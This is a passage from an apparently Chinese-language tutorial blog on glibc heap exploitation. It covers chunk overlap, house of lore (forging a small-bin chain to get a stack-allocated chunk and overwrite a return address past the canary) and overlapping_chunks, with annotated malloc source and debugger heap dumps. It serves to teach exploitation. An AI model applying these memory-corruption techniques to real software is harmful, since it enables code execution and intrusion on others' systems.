系统修改的是我们的 fake  c.prev_size。所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 free chunk 。然后我们在 create 一个 chunk b2。</p><p>然后就是，我们先后 free b1 ，c。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span> <span class="built_in">free</span>(b1);</span><br><span class="line"><span class="number">96</span> <span class="built_in">free</span>(c);</span><br></pre></td></tr></table></figure><p>先 free b1，这个时候 chunk c 会认为 b1 就是 chunk b。当我们 free chunk c 的时候，chunk会和chunk b1合并。由于 chunk c 认为 chunk b1 依旧是 chunk b。因此会把中间的 chunk c 吞并。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x603110 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x321,</span><br><span class="line">  fd = 0x6032b0,</span><br><span class="line">  bk = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910175250.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910175250.png"></a></p><p>此时 chunk b2 已经被吞并。</p><p>然后我们在把这块 chunk create出来。假设我们之前对 chunk b2 写的是一个指针。此时我们 得到的新 chunk d。我们可以对chunk b2的内容进行任意读写了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">98</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">   <span class="number">99</span> d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">  <span class="number">100</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line">  <span class="number">101</span></span><br><span class="line">► <span class="number">102</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">  <span class="number">103</span> <span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line">  <span class="number">104</span></span><br><span class="line">  <span class="number">105</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br></pre></td></tr></table></figure><h3 id="0x08-house-of-lore"><a href="#0x08-house-of-lore" class="headerlink" title="0x08 house_of_lore"></a>0x08 house_of_lore</h3><p>house of lore 技术主要是用来伪造一个 small bin 链。</p><ul><li><p>House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。</p></li><li><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p></li><li><p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p></li></ul><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">   hold one size each, no searching within bins is necessary.</span><br><span class="line">   (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">   processed to find best fit. But for small ones, fits are exact</span><br><span class="line">   anyway, so we can check now, which is faster.)</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">if (in_smallbin_range(nb)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 获取 small bin 的索引</span><br><span class="line">    idx &#x3D; smallbin_index(nb);</span><br><span class="line">    &#x2F;&#x2F; 获取对应 small bin 中的 chunk 指针</span><br><span class="line">    bin &#x3D; bin_at(av, idx);</span><br><span class="line">    &#x2F;&#x2F; 先执行 victim&#x3D; last(bin)，获取 small bin 的最后一个 chunk</span><br><span class="line">    &#x2F;&#x2F; 如果 victim &#x3D; bin ，那说明该 bin 为空。</span><br><span class="line">    &#x2F;&#x2F; 如果不相等，那么会有两种情况</span><br><span class="line">    if ((victim &#x3D; last(bin)) !&#x3D; bin) &#123;</span><br><span class="line">        &#x2F;&#x2F; 第一种情况，small bin 还没有初始化。</span><br><span class="line">        if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;</span><br><span class="line">            &#x2F;&#x2F; 执行初始化，将 fast bins 中的 chunk 进行合并</span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        &#x2F;&#x2F; 第二种情况，small bin 中存在空闲的 chunk</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">            bck &#x3D; victim-&gt;bk;</span><br><span class="line">            &#x2F;&#x2F; 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">            if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">                errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">                goto errout;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 设置 victim 对应的 inuse 位</span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            &#x2F;&#x2F; 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">            bin-&gt;bk &#x3D; bck;</span><br><span class="line">            bck-&gt;fd &#x3D; bin;</span><br><span class="line">            &#x2F;&#x2F; 如果不是 main_arena，设置对应的标志</span><br><span class="line">            if (av !&#x3D; &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            &#x2F;&#x2F; 细致的检查</span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            &#x2F;&#x2F; 将申请到的 chunk 转化为对应的 mem 状态</span><br><span class="line">            void *p &#x3D; chunk2mem(victim);</span><br><span class="line">            &#x2F;&#x2F; 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从下面的这部分我们可以看出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">bck &#x3D; victim-&gt;bk;</span><br><span class="line">&#x2F;&#x2F; 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">    errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 设置 victim 对应的 inuse 位</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">&#x2F;&#x2F; 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">bin-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; bin;</span><br></pre></td></tr></table></figure><p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chun。</p><p>调试：</p><p>首先，我们创建一个 small bin chunk。然后在栈上伪造两个 chunk。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926152853.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926152853.png"></a></p><p>伪造的两个 chunk ， chunk 1 的 fd 指向 victim chunk，bk 指向 chunk2 ，chunk 2 的fd 指向 chunk 1。这样就构造了一个 small bin 链。</p><p>由于上文提到的  check </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">7</span> <span class="keyword">else</span></span><br><span class="line"> <span class="number">8</span>     &#123;</span><br><span class="line"> <span class="number">9</span>       bck = victim-&gt;bk;</span><br><span class="line"><span class="number">10</span>     <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span>                   errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line"><span class="number">13</span>                   <span class="keyword">goto</span> errout;</span><br><span class="line"><span class="number">14</span>                 &#125;</span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="number">16</span>        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line"><span class="number">17</span>        bin-&gt;bk = bck;</span><br><span class="line"><span class="number">18</span>        bck-&gt;fd = bin;</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>        [ ... ]</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span> */</span><br></pre></td></tr></table></figure><p>所以伪造了 两个chunk 以及他们的 fd ，bk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>在 free 掉 victim 之前，我们 malloc 了一块 size 为1000的chunk，只是为了确保在 free 时 victim chunk 不会被合并进 top chunk 里。</p><p>然后我们释放掉 victim， 并申请一块比较大的chunk，只需要大到让 malloc 在 unsorted bin 中找不到合适的就可以了，这样就会让 victim 被整理到 smallbins中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70: 0x7ffff7dd1bb8 (main_arena+184) —▸ 0x603000 ◂— 0x7ffff7dd1bb8</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>接着就是漏洞利用的一个重点，我们假设我们有机会去修改victim chunk 的 bk 指针。并让他指向我们在栈上 fake 的chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png"></a></p><p>这个时候 ， victim chunk的bk指向 stack_buffer_1,   fake chunk 1 的fd 指向了 victim chunk。我们知道 small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部。这时整条链是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head  &lt;-fake chunk2 &lt;- facke chunk1 &lt;- victim chunk</span><br></pre></td></tr></table></figure><p>fake chunk 2 的 bk 指向了一个未定义的地址，如果能通过内存泄露等手段，拿到 HEAD 的地址并填进去，整条链就闭合了。当然这里完全没有必要这么做。</p><p>紧接着，我们 malloc 一块 chunk，如果我们malloc 的大小正好是 victim chunk 的大小，这个时候系统会将 victim chunk 取出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png"></a></p><p>然后，我们再 malloc 一块。这个时候，我们就能欺骗系统，在stack栈上返回一块chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">101</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="number">102</span>   <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="number">103</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line">  <span class="number">104</span></span><br><span class="line">► <span class="number">105</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233627.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233627.png"></a></p><p>然后我们可以完成攻击</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">108</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">► <span class="number">109</span>   <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="number">110</span>   <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br></pre></td></tr></table></figure><p>P4 + 40 的位置刚好是 eip的的位置。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233920.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233920.png"></a></p><p>最后，我们说的是small bin 链的构造，其实我这里用的是 fastbin ，其释放后虽然是被加入到 fast bins 中，而small bin是释放后 放入 unsorted bin，但 malloc 之后，也会被整理到 small bins 里。</p><h3 id="0x09-overlapping-chunks"><a href="#0x09-overlapping-chunks" class="headerlink" title="0x09 overlapping_chunks"></a>0x09 overlapping_chunks</h3><p>简单的堆重叠，通过修改 size，吞并邻块，然后再下次 malloc的时候，把邻块给一起分配出来。这个时候就有了两个指针可以操作邻块。一个新块指针，一个旧块指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="number">23</span> p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="number">24</span> p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>首先分配，三个chunk。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603200 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x81,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br></pre></td></tr></table></figure><p>紧接着 free 掉 chunk2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure><p>这个时候 chunk 2 被分配到了 unsortedbin</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x3131313131313131,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x3232323232323232,</span><br><span class="line">  bk_nextsize = 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x603100 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>然后，假设我们这个时候可以通过堆溢出修改 chunk 2的size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">42</span> <span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="number">43</span> <span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="number">44</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line"><span class="number">45</span>  evil_chunk_size, evil_region_size);</span><br><span class="line"><span class="number">46</span></span><br><span class="line"><span class="number">47</span> *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x101</span>,</span><br><span class="line">  fd = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  bk = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x3131313131313131</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603100</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  size = <span class="number">0x181</span>,</span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  fd_nextsize = <span class="number">0x3232323232323232</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x3232323232323232</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603280</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x3333333333333333</span>,</span><br><span class="line">  size = <span class="number">0x20d81</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候，我们发现 chunk 2的size被修改后，吞并了 chunk3，如果我们这时候 malloc 一块 0x180 的chunk。即将会把 chunk2 和chunk3 一起分配出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size); <span class="comment">//evil_region_size = 0x180-8</span></span><br></pre></td></tr></table></figure><p>当我们对 p4 进行写操作的时候</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">66</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="number">67</span> <span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="number">68</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="number">69</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br></pre></td></tr></table></figure><p>顺便把 p3 也写了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/40gx 0x603100</span><br><span class="line">0x603100:0x31313131313131310x0000000000000181</span><br><span class="line">0x603110:0x34343434343434340x3434343434343434</span><br><span class="line">0x603120:0x34343434343434340x3434343434343434</span><br><span class="line">0x603130:0x34343434343434340x3434343434343434</span><br><span class="line">0x603140:0x34343434343434340x3434343434343434</span><br><span class="line">0x603150:0x34343434343434340x3434343434343434</span><br><span class="line">0x603160:0x34343434343434340x3434343434343434</span><br><span class="line">0x603170:0x34343434343434340x3434343434343434</span><br><span class="line">0x603180:0x34343434343434340x3434343434343434</span><br><span class="line">0x603190:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031a0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031b0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031c0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031d0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031e0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031f0:0x34343434343434340x3434343434343434</span><br><span class="line">0x603200:0x34343434343434340x3434343434343434</span><br><span class="line">0x603210:0x34343434343434340x3434343434343434</span><br><span class="line">0x603220:0x34343434343434340x3434343434343434</span><br><span class="line">0x603230:0x34343434343434340x3434343434343434</span><br><span class="line"></span><br><span class="line">PwnLife&gt; p p3</span><br><span class="line"><span class="variable">$13</span> = (intptr_t *) 0x603210</span><br><span class="line">PwnLife&gt; x/20gx  p3</span><br><span class="line">0x603210:0x34343434343434340x3434343434343434</span><br><span class="line">0x603220:0x34343434343434340x3434343434343434</span><br><span class="line">0x603230:0x34343434343434340x3434343434343434</span><br><span class="line">0x603240:0x34343434343434340x3434343434343434</span><br><span class="line">0x603250:0x34343434343434340x3434343434343434</span><br><span class="line">0x603260:0x34343434343434340x3434343434343434</span><br><span class="line">0x603270:0x34343434343434340x3434343434343434</span><br><span class="line">0x603280:0x34343434343434340x0000000000020d81</span><br><span class="line">0x603290:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032a0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>我们也可以去修改 p3 ，修改 p4的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">71</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then 